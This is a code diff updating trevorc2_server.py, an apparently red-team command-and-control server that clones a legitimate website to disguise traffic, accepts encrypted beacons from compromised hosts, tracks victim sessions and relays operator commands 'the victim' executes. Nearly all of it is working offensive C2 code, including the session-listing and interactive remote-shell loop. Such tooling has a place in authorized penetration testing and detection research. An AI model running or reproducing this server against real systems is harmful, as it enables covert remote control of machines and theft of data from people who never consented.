Updated by Library Project Script . 20190604

+++ trevorc2_server.py
@@ -13,7 +13,7 @@ via a query string parameter.
 """
 
 # CONFIG CONSTANTS:
-URL = ("https://www.google.com/")  # URL to clone to house a legitimate website
+URL = ("https://www.google.com")  # URL to clone to house a legitimate website
 USER_AGENT = ("User-Agent: Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko")
 
 # THIS IS WHAT PATH WE WANT TO HIT FOR CODE - THIS CAN BE WHATEVER PATH YOU WANT
@@ -44,18 +44,32 @@ import sys
 import time
 import glob
 import base64
-import bleach
+try: import bleach
+except ImportError:
+    print("[!] Python module bleach not installed. Try pip install bleach and re-run TrevorC2 Server.")
+    sys.exit()
 import shutil
 import logging
 import urllib3
 import requests
 import threading
-import tornado.web
-import tornado.ioloop
-import tornado.httpserver
+import subprocess
+try:
+    import tornado.web
+    import tornado.ioloop
+    import tornado.httpserver
+except ImportError:
+    print("[!] Python module tornado not installed. Try pip install tornado and re-run TrevorC2 Server.")
+    sys.exit()
 import hashlib
 from Crypto import Random
 from Crypto.Cipher import AES
+
+# asyncio is python3 only - only needed for python3 regardless for tornado fix
+python_version = ("")
+try: import asyncio
+except ImportError: python_version = "v2"
+
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 logging.getLogger("tornado.general").setLevel(logging.CRITICAL)
@@ -64,12 +78,22 @@ logging.basicConfig(level=logging.CRITICAL, format='[%(asctime)s] %(message)s', 
 log = logging.getLogger(__name__)
 
 __author__ = 'Dave Kennedy (@HackingDave)'
-__version__ = 0.3
+__version__ = 0.7
 
 # ROOT CHECK
 if os.geteuid() != 0:
     print("\n[!] TrevorC2 needs to be run as root (web socket binding, etc.)... Re-run TrevorC2 as sudo/root in order to run.")
     sys.exit()
+
+# python 2/3 compatibility
+try: input = raw_input
+except NameError: pass
+
+# used for registering assets
+assets = []
+def register_assets(hostname):
+    global assets
+    assets.append(hostname)
 
 # AESCipher Library Python2/3 support - http://depado.markdownblog.com/2015-05-11-aes-cipher-with-python-3-x
 class AESCipher(object):
@@ -78,7 +102,7 @@ class AESCipher(object):
     Also ensure the coherence and the type of the data with a unicode to byte converter.
     """
     def __init__(self, key):
-        self.bs = 32
+        self.bs = 16
         self.key = hashlib.sha256(AESCipher.str_to_bytes(key)).digest()
 
     @staticmethod
@@ -139,13 +163,19 @@ def clone_site(user_agent, url):
 
     # run our wget
     print("[*] Cloning website: " + url)
-    web_request = requests.get(url, headers={'User-Agent': user_agent}, verify=0)
-    if web_request.status_code != 200 or len(web_request.content) < 1:
-        print("[!] Unable to clone the site. Status Code: %s" % web_request.status_code)
-        print("[!] Exiting TrevorC2...")
-        sys.exit()
-    with open("clone_site/index.html", 'wb') as fh:
-        fh.write(web_request.content)
+    try:
+        web_request = requests.get(url, headers={'User-Agent': user_agent}, verify=0)
+        if web_request.status_code != 200 or len(web_request.content) < 1:
+            print("[!] Unable to clone the site. Status Code: %s" % web_request.status_code)
+            print("[!] Exiting TrevorC2...")
+            sys.exit()
+
+        with open("clone_site/index.html", 'wb') as fh:
+            fh.write(web_request.content)
+
+    except requests.ConnectionError:
+        print("[-] Unable to clone website due to connection issue (are you connected to the Internet?), writing a default one for you...")
+        with open("clone_site/index.html", "w") as fh: fh.write("<head></head><html><body>It Works!</body></html>")
 
     # report success
     if os.path.isfile("clone_site/index.html"):
@@ -198,15 +228,24 @@ class SPQ(tornado.web.RequestHandler):
                 query = args[param][0]
         if not query:
             return
-
         query = base64.b64decode(query)
         query_output = cipher.decrypt(query)
-        with open("clone_site/received.txt", "w") as fh:
-            fh.write('=-=-=-=-=-=-=-=-=-=-=\n(CLIENT: {})\n{}'.format(remote_ip, str(query_output)))
 
-        with open("clone_site/instructions.txt", "w") as fh:
-            no_instructions = cipher.encrypt("nothing".encode())
-            fh.write(no_instructions)
+        # register hostnames
+        if "magic_hostname=" in query_output:
+            hostname = query_output.split("=")[1]
+            register_assets(hostname + ":" + remote_ip)
+            print("\n*** Received connection from {} and hostname {} for TrevorC2.".format(remote_ip, hostname))
+
+        else:
+            hostname = query_output.split("::::")[0]
+            data = query_output.split("::::")[1]
+            with open("clone_site/received.txt", "w") as fh:
+                fh.write('=-=-=-=-=-=-=-=-=-=-=\n(HOSTNAME: {}\nCLIENT: {})\n{}'.format(hostname, remote_ip, str(data)))
+
+            with open("clone_site/instructions.txt", "w") as fh:
+                no_instructions = cipher.encrypt("nothing".encode())
+                fh.write(no_instructions)
 
 def main_c2():
     """Start C2 Server."""
@@ -215,16 +254,26 @@ def main_c2():
         (SITE_PATH_QUERY, SPQ),
         (r'/.*', UnknownPageHandler)  # Make this the last line, if not matched, will hit this rule.
     ])
-    if SSL:
-        http_server = tornado.httpserver.HTTPServer(
-            application, ssl_options={'certfile': CERT_FILE, 'ssl_version': ssl.PROTOCOL_TLSv1})
-        http_server.listen(443)
-        tornado.ioloop.IOLoop.instance().start()
-    else:
-        http_server = tornado.httpserver.HTTPServer(application)
-        http_server.listen(80)
-        tornado.ioloop.IOLoop.instance().start()
 
+    try:
+        if SSL:
+            http_server = tornado.httpserver.HTTPServer(application, ssl_options={'certfile': CERT_FILE, 'ssl_version': ssl.PROTOCOL_TLSv1})
+            http_server.listen(443)
+            tornado.ioloop.IOLoop.instance().start()
+        else:
+            # if we are using pythonv3+
+            if python_version != "v2": asyncio.set_event_loop(asyncio.new_event_loop())
+            http_server = tornado.httpserver.HTTPServer(application)
+            http_server.listen(80)
+            tornado.ioloop.IOLoop.instance().start()
+            http.start()
+
+    except Exception as e:
+        if "Address already in use" in str(e):
+            print("[!] Something is already listening on the port. Stop the service and try again (hint service apache2 stop).")
+            os._exit(1) # need os._exit() vs sys.exit due to inside of thread
+        else:
+            print("[!] Something went wrong, printing error message here: " + str(e))
 
 if __name__ == "__main__":
 
@@ -276,7 +325,7 @@ if __name__ == "__main__":
     print("https://www.trustedsec.com")
     clone_site(USER_AGENT, URL)
     PYTHONVER = sys.version_info[0]
-    print('[*] Starting C2 Server...')
+    print('[*] Starting Trevor C2 Server...')
     threading.Thread(target=main_c2).start()
 
     # here we say no instructions to the client
@@ -286,29 +335,73 @@ if __name__ == "__main__":
 
     print("[*] Next, enter the command you want the victim to execute.")
     print("[*] Client uses random intervals, this may take a few.")
+    print("[*] Type help for usage. Example commands, list, interact.\n")
     try:
         while 1:
-            if PYTHONVER == 2:
-                task = raw_input("Enter the command to execute on victim: ")
-            elif PYTHONVER == 3:
-                task = input("Enter the command to execute on the victim: ")
-            else:
-                sys.exit("Not sure I support this version of Python.")
-            task_out = cipher.encrypt(task.encode())
-            with open("clone_site/instructions.txt", "w") as fh:
-                fh.write(task_out)
-            print("[*] Waiting for command to be executed, be patient, results will be displayed here...")
-            while 1:
-                # we received a hit with our command
-                if os.path.isfile("clone_site/received.txt"):
-                    data = open("clone_site/received.txt", "r").read()
-                    print("[*] Received response back from client...")
-                    print(data)
-                    # remove this so we don't use it anymore
-                    os.remove("clone_site/received.txt")
-                    break
-                time.sleep(.3)
+            task = input("trevorc2>")
+            if task == "help" or task == "?":
+                print("*** TrevorC2 Help Menu ***\n\n")
+                print("Command Usage:\n")
+                print("list - will list all shells available")
+                print("interact <id> - allow you to select which shells to interact with\n")
+                print("ifconfig - allows you to see your interface data for server")
 
+            # list available shells
+            if task == "list":
+                counter = 0
+                print("\n*** Available TrevorC2 Shells Below ***\n")
+                if assets == []:
+                    print("No available TrevorC2 shells.")
+                else:
+                    print("Format: <session_id> <hostname>:<ipaddress>\n")
+                    for asset in assets:
+                        counter = counter + 1
+                        print(str(counter) + ". " + asset + " (Trevor C2 Established)")
+
+                print("\n")
+
+            if task == "interact": print("[!] Correct usage: interact <session_id>")
+
+            if task == "ifconfig":
+                stdout = subprocess.Popen("ifconfig", shell=True)
+                proc = stdout.communicate()[0]
+                print(proc)
+
+            if task == "quit" or task == "exit":
+                print("[*] Exiting TrevorC2... ")
+                os.system('kill $PPID') # This is an ugly method to kill process, due to threading this is a quick hack to kill with control-c. Will fix later.
+
+
+            if "interact " in task:
+                if assets != []:
+                    hostname_select = task.split(" ")[1]
+                    hostname_select = int(hostname_select) - 1
+                    hostname = assets[hostname_select]
+                    hostname = hostname.split(":")[0]
+                    print("[*] Dropping into trevorc2 shell...")
+                    print("[*] Use exit or back to select other shells")
+                    while 1:
+                        task = input(hostname + ":trevorc2>")
+                        if task == "quit" or task == "exit" or task == "back": break
+                        task = (hostname + "::::" + task)
+                        task_out = cipher.encrypt(task.encode())
+                        with open("clone_site/instructions.txt", "w") as fh:
+                            fh.write(task_out)
+                        print("[*] Waiting for command to be executed, be patient, results will be displayed here...")
+                        while 1:
+                            # we received a hit with our command
+                            if os.path.isfile("clone_site/received.txt"):
+                                data = open("clone_site/received.txt", "r").read()
+                                print("[*] Received response back from client...")
+                                print(data)
+                                # remove this so we don't use it anymore
+                                os.remove("clone_site/received.txt")
+                                break
+                            time.sleep(.3)
+                
+                else:
+                    print("[!] No sessions have been established to execute commands.")
+                    
     # cleanup when using keyboardinterrupt
     except KeyboardInterrupt:
         if os.path.isdir("clone_site/"): shutil.rmtree("clone_site/")
